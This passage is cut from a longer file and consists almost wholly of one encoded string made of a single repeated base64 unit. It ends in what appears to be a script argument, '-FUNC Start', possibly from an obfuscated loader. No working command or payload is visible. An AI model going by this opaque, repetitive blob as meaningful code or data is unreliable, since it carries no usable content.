FxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcX"  -FUNC Start
